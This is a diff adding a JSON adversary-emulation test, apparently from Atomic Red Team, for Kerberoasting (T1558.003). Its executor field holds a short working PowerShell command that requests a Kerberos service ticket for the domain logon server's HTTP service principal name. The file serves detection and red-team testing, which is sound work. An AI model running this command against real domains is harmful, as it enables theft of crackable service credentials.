@@ -1,0 +1,30 @@
+{
+    "name": "Request A Single Ticket via PowerShell",
+    "description": "The following test will utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer. This behavior is typically used during a kerberos or silver ticket attack.  A successful execution will output the SPNs for the endpoint in question. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "Add-Type -AssemblyName System.IdentityModel\n$ComputerFQDN=$env:LogonServer.trimStart('\\') + \".\" + $env:UserDnsDomain\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"HTTP/$ComputerFQDN\" \n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1558.003",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Kerberoasting",
+    "source": "ART",
+    "uuid": "988539bc-2ed7-4e62-aec6-7c5cf6680863",
+    "arguments": null,
+    "preconditions": [
+        {
+            "description": "Computer must be domain joined\n",
+            "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
